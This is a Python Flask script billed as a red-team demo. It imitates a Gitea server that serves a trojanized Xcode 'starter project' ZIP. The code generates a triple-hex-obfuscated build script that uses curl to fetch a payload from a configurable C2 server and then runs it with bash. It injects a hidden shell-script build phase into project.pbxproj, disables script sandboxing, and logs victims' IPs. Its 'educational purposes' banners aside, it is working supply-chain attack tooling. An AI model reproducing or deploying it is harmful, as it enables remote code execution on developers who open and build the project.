#!/usr/bin/env python3
"""
RED TEAM DEMO - Gitea Server Simulator
========================================
Simulates a malicious Gitea instance for supply chain attack demos.

Features:
- Fake Gitea web interface
- Malicious repository hosting
- Trojanized ZIP downloads
- Git clone interception
- User simulation

This replicates the attack infrastructure from the PCAP:
- Gitea v1.25.1 at localhost:8080
- Attacker repo: jargal.karlsen/starter-project
- Victim user: walter

Usage:
    python3 gitea_simulator.py --port 8080
    python3 gitea_simulator.py --port 8080 --c2 http://attacker:8888

FOR EDUCATIONAL PURPOSES ONLY
"""

import argparse
import io
import logging
import os
import shutil
import sys
import zipfile
from datetime import datetime
from pathlib import Path

try:
    from flask import Flask, request, send_file, redirect, render_template_string
except ImportError:
    print("[!] Flask not installed. Run: pip install flask")
    sys.exit(1)

# ============================================================================
# CONFIGURATION
# ============================================================================

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

# C2 server URL (set via CLI)
C2_SERVER = "http://localhost:8888"

# Logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# Track activity
activity_log = []

# ============================================================================
# OBFUSCATION FUNCTIONS
# ============================================================================

def triple_hex_encode(command: str) -> str:
    """Triple hex encode for xcassets.sh"""
    result = command
    for i in range(3):
        result = result.encode('utf-8').hex()
    return result


def generate_malicious_xcassets_sh(c2_url: str) -> str:
    """Generate the malicious build script"""
    beacon_cmd = f'curl -fskL {c2_url}/a -o /tmp/.o.txt'
    encoded = triple_hex_encode(beacon_cmd)
    
    return f'''#!/usr/bin/env bash
x=$(echo '{encoded}' | xxd -p -r | xxd -p -r | xxd -p -r | sh )
bash -c "$x" 
sleep 2
bash /tmp/.o.txt
'''


def generate_malicious_pbxproj() -> str:
    """Generate project.pbxproj with malicious build phase"""
    # This is a simplified version - in real demo, copy from extracted_zip
    return '''// !$*UTF8*$!
{
    archiveVersion = 1;
    classes = { };
    objectVersion = 77;
    objects = {

/* Begin PBXNativeTarget section */
        96543F8F2EAA84D5009FF60C /* MarkdownEditor */ = {
            isa = PBXNativeTarget;
            buildConfigurationList = 96543FB22EAA84D5009FF60C;
            buildPhases = (
                96543F8C2EAA84D5009FF60C /* Sources */,
                96543F8D2EAA84D5009FF60C /* Frameworks */,
                96543F8E2EAA84D5009FF60C /* Resources */,
                A1B2C3D4E5F6G7H8I9J0K1L2 /* ShellScript */,
            );
            name = MarkdownEditor;
            productType = "com.apple.product-type.application";
        };
/* End PBXNativeTarget section */

/* Begin PBXShellScriptBuildPhase section */
A1B2C3D4E5F6G7H8I9J0K1L2 /* ShellScript */ = {
    isa = PBXShellScriptBuildPhase;
    buildActionMask = 2147483647;
    files = ( );
    inputPaths = ( );
    outputPaths = ( );
    runOnlyForDeploymentPostprocessing = 0;
    shellPath = /bin/sh;
    shellScript = "\\"${PROJECT_DIR}/MarkdownEditor.xcodeproj/xcuserdata/.xcassets/xcassets.sh\\"";
};
/* End PBXShellScriptBuildPhase section */

/* Begin XCBuildConfiguration section */
        96543FB02EAA84D5009FF60C /* Debug */ = {
            isa = XCBuildConfiguration;
            buildSettings = {
                ENABLE_USER_SCRIPT_SANDBOXING = NO;
            };
            name = Debug;
        };
/* End XCBuildConfiguration section */
    };
    rootObject = 96543F882EAA84D5009FF60C;
}
'''


# ============================================================================
# TEMPLATES
# ============================================================================

GITEA_INDEX = '''
<!DOCTYPE html>
<html lang="en-US" data-theme="gitea-auto">
<head>
    <title>Gitea: Git with a cup of tea</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .header { background: #2d333b; color: white; padding: 10px 20px; margin: -20px -20px 20px; }
        .header h1 { margin: 0; font-size: 1.5em; }
        .repo-list { background: white; border-radius: 8px; padding: 20px; }
        .repo { padding: 15px; border-bottom: 1px solid #eee; }
        .repo:last-child { border-bottom: none; }
        .repo h3 { margin: 0 0 5px; }
        .repo h3 a { color: #0366d6; text-decoration: none; }
        .repo p { margin: 0; color: #666; font-size: 0.9em; }
        .warning { background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Gitea: Git with a cup of tea</h1>
    </div>
    
    <div class="warning">
        <strong>RED TEAM DEMO</strong> - This is a simulated malicious Gitea server for educational purposes.
    </div>
    
    <div class="repo-list">
        <h2>Explore Repositories</h2>
        <div class="repo">
            <h3><a href="/jargal.karlsen/starter-project">jargal.karlsen/starter-project</a></h3>
            <p>Xcode starter project - A helpful template for iOS/macOS development</p>
            <p style="margin-top: 5px; color: #999;">Updated recently</p>
        </div>
    </div>
</body>
</html>
'''

REPO_PAGE = '''
<!DOCTYPE html>
<html lang="en-US" data-theme="gitea-auto">
<head>
    <title>jargal.karlsen/starter-project - Gitea</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .header { background: #2d333b; color: white; padding: 10px 20px; margin: -20px -20px 20px; }
        .header h1 { margin: 0; font-size: 1.5em; }
        .content { background: white; border-radius: 8px; padding: 20px; }
        .clone-box { background: #f6f8fa; padding: 15px; border-radius: 4px; margin: 20px 0; }
        .clone-box code { background: #e1e4e8; padding: 5px 10px; border-radius: 3px; }
        .btn { display: inline-block; background: #2ea44f; color: white; padding: 10px 20px; 
               text-decoration: none; border-radius: 6px; margin: 5px; }
        .btn:hover { background: #22863a; }
        .btn-secondary { background: #0366d6; }
        .warning { background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
        .files { border: 1px solid #e1e4e8; border-radius: 6px; }
        .file { padding: 10px 15px; border-bottom: 1px solid #e1e4e8; }
        .file:last-child { border-bottom: none; }
        .file-icon { margin-right: 10px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>jargal.karlsen / starter-project</h1>
    </div>
    
    <div class="warning">
        <strong>RED TEAM DEMO</strong> - This repository contains a trojanized Xcode project.
        Downloading and building will trigger the supply chain attack simulation.
    </div>
    
    <div class="content">
        <h2>Xcode Starter Project</h2>
        <p>A helpful template for iOS/macOS development. Get started quickly!</p>
        
        <div class="clone-box">
            <strong>Clone this repository:</strong><br><br>
            <code>git clone http://localhost:{{ port }}/jargal.karlsen/starter-project.git</code>
        </div>
        
        <a href="/jargal.karlsen/starter-project/archive/main.zip" class="btn">
            Download ZIP
        </a>
        <a href="/jargal.karlsen/starter-project/archive/main.zip" class="btn btn-secondary">
            Code
        </a>
        
        <h3 style="margin-top: 30px;">Files</h3>
        <div class="files">
            <div class="file"><span class="file-icon">📁</span> MarkdownEditor.xcodeproj</div>
            <div class="file"><span class="file-icon">📁</span> MarkdownEditor</div>
            <div class="file"><span class="file-icon">📄</span> README.md</div>
        </div>
        
        <h3 style="margin-top: 30px;">README.md</h3>
        <div style="background: #f6f8fa; padding: 15px; border-radius: 4px;">
            <h1>Markdown Editor</h1>
            <p>A simple markdown editor for macOS built with SwiftUI.</p>
            <h2>Getting Started</h2>
            <ol>
                <li>Download or clone this repository</li>
                <li>Open <code>MarkdownEditor.xcodeproj</code> in Xcode</li>
                <li>Build and run (Cmd+R)</li>
            </ol>
        </div>
    </div>
</body>
</html>
'''

ACTIVITY_LOG_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Gitea Simulator - Activity Log</title>
    <style>
        body { font-family: monospace; background: #1a1a2e; color: #0f0; padding: 20px; }
        h1 { color: #f00; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid #333; padding: 8px; text-align: left; }
        th { background: #16213e; color: #0ff; }
        .warning { background: #4a0000; border: 2px solid #f00; padding: 15px; margin-bottom: 20px; }
    </style>
    <meta http-equiv="refresh" content="5">
</head>
<body>
    <div class="warning">RED TEAM DEMO - Gitea Simulator Activity Log</div>
    <h1>Activity Log</h1>
    <p>Tracking victim interactions with malicious repository</p>
    
    <table>
        <tr>
            <th>Timestamp</th>
            <th>Action</th>
            <th>Source IP</th>
            <th>Details</th>
        </tr>
        {% for entry in activity %}
        <tr>
            <td>{{ entry.timestamp }}</td>
            <td>{{ entry.action }}</td>
            <td>{{ entry.source_ip }}</td>
            <td>{{ entry.details }}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
'''


# ============================================================================
# ROUTES
# ============================================================================

@app.route('/')
def index():
    """Gitea homepage"""
    log_activity('page_view', 'Viewed homepage')
    return GITEA_INDEX

@app.route('/explore/repos')
def explore():
    """Explore repositories"""
    log_activity('page_view', 'Browsed repository explorer')
    return redirect('/')

@app.route('/jargal.karlsen/starter-project')
def repo_page():
    """Malicious repository page"""
    log_activity('repo_view', 'Viewed malicious repository: jargal.karlsen/starter-project')
    return render_template_string(REPO_PAGE, port=request.host.split(':')[1] if ':' in request.host else '8080')

@app.route('/jargal.karlsen/starter-project.git/info/refs')
def git_info_refs():
    """Git clone - info/refs"""
    log_activity('git_clone', 'Git clone initiated (info/refs)')
    # Return minimal git refs
    refs = "001e# service=git-upload-pack\n0000"
    refs += "003f0000000000000000000000000000000000000000 capabilities^{}\n"
    refs += "003faaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa refs/heads/main\n"
    refs += "0000"
    return refs, 200, {'Content-Type': 'application/x-git-upload-pack-advertisement'}

@app.route('/jargal.karlsen/starter-project/archive/main.zip')
def download_zip():
    """Serve trojanized ZIP file"""
    log_activity('zip_download', 'Downloaded malicious ZIP: starter-project-main.zip')
    
    # Create in-memory ZIP with malicious content
    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Create directory structure
        base = 'starter-project-main'
        
        # README
        zf.writestr(f'{base}/README.md', '''# Markdown Editor

A simple markdown editor for macOS built with SwiftUI.

## Getting Started

1. Open `MarkdownEditor.xcodeproj` in Xcode
2. Build and run (Cmd+R)
''')
        
        # Malicious xcassets.sh
        xcassets_content = generate_malicious_xcassets_sh(C2_SERVER)
        zf.writestr(
            f'{base}/MarkdownEditor.xcodeproj/xcuserdata/.xcassets/xcassets.sh',
            xcassets_content
        )
        
        # Malicious project.pbxproj
        zf.writestr(
            f'{base}/MarkdownEditor.xcodeproj/project.pbxproj',
            generate_malicious_pbxproj()
        )
        
        # Minimal Swift files
        zf.writestr(f'{base}/MarkdownEditor/MarkdownEditorApp.swift', '''import SwiftUI

@main
struct MarkdownEditorApp: App {
    var body: some Scene {
        WindowGroup {
            ContentView()
        }
    }
}
''')
        
        zf.writestr(f'{base}/MarkdownEditor/ContentView.swift', '''import SwiftUI

struct ContentView: View {
    @State private var text = "# Hello World"
    
    var body: some View {
        TextEditor(text: $text)
            .frame(minWidth: 400, minHeight: 300)
    }
}
''')
    
    zip_buffer.seek(0)
    
    logger.info(f"[DOWNLOAD] Serving trojanized ZIP to {request.remote_addr}")
    
    return send_file(
        zip_buffer,
        mimetype='application/zip',
        as_attachment=True,
        download_name='starter-project-main.zip'
    )

@app.route('/admin/activity')
def admin_activity():
    """View activity log"""
    return render_template_string(ACTIVITY_LOG_PAGE, activity=activity_log[-50:])

@app.route('/walter')
def walter_profile():
    """Victim profile page"""
    log_activity('profile_view', 'Viewed user profile: walter')
    return '''
    <html>
    <head><title>walter - Gitea</title></head>
    <body style="font-family: sans-serif; padding: 20px; background: #f5f5f5;">
        <h1>walter</h1>
        <p>Email: walter.s@zelicandsons.local</p>
        <p>Joined: 2025-11-18</p>
        <p><a href="/">Back to Home</a></p>
    </body>
    </html>
    '''

@app.route('/<path:path>')
def catch_all(path):
    """Catch-all for unhandled routes"""
    log_activity('unknown_path', f'Accessed: /{path}')
    return redirect('/')


# ============================================================================
# HELPERS
# ============================================================================

def log_activity(action: str, details: str):
    """Log activity for monitoring"""
    entry = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'action': action,
        'source_ip': request.remote_addr if request else 'unknown',
        'details': details
    }
    activity_log.append(entry)
    logger.info(f"[{action.upper()}] {details} from {entry['source_ip']}")


# ============================================================================
# MAIN
# ============================================================================

def main():
    global C2_SERVER
    
    parser = argparse.ArgumentParser(
        description='RED TEAM DEMO - Gitea Server Simulator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
    python3 gitea_simulator.py --port 8080
    python3 gitea_simulator.py --port 8080 --c2 http://attacker:8888

Endpoints:
    /                                       - Homepage
    /jargal.karlsen/starter-project         - Malicious repo page  
    /jargal.karlsen/starter-project/archive/main.zip - Trojanized ZIP
    /admin/activity                         - Activity log
        '''
    )
    
    parser.add_argument('--port', type=int, default=8080, help='Port (default: 8080)')
    parser.add_argument('--host', default='127.0.0.1', help='Host (default: 127.0.0.1)')
    parser.add_argument('--c2', default='http://localhost:8888', help='C2 server URL')
    parser.add_argument('--debug', action='store_true', help='Debug mode')
    
    args = parser.parse_args()
    C2_SERVER = args.c2
    
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║              GITEA SERVER SIMULATOR                          ║
    ║          Malicious Git Repository Hosting                    ║
    ╠══════════════════════════════════════════════════════════════╣
    ║  FOR EDUCATIONAL PURPOSES ONLY - RED TEAM VS BLUE TEAM       ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    logger.info(f"Starting Gitea simulator on {args.host}:{args.port}")
    logger.info(f"C2 server configured: {C2_SERVER}")
    logger.info(f"Malicious repo: http://{args.host}:{args.port}/jargal.karlsen/starter-project")
    logger.info(f"Activity log: http://{args.host}:{args.port}/admin/activity")
    
    app.run(host=args.host, port=args.port, debug=args.debug)


if __name__ == '__main__':
    main()
